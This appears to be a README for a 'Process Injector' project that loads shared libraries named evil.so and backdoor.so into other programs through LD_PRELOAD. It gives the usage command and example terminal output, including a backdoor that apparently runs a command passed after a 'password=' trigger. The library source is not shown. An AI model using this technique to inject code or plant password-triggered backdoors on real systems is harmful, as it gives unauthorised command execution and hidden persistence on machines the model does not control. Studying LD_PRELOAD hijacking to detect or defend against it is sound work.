# Process Injector

#### Usage:
```
LD_PRELOAD=`pwd`/evil.so [COMMAND]
```


#### Example: 
```
➜  ProcessInjector git:(master) ✗ LD_PRELOAD=`pwd`/evil.so man
Makefile  README.md  evil.c  evil.so  main  main.c
What manual page do you want?
```

```
➜  ProcessInjector git:(master) ✗ LD_PRELOAD=`pwd`/backdoor.so ./test_backdoor   
password=/usr/bin/ps                                                             
Strlen: 20                                                                       
  PID TTY          TIME CMD                                                      
  15531 pts/3    00:00:00 zsh                                                      
  19330 pts/3    00:00:00 ps                                                       
  19331 pts/3    00:00:00 zsh                                                      

```

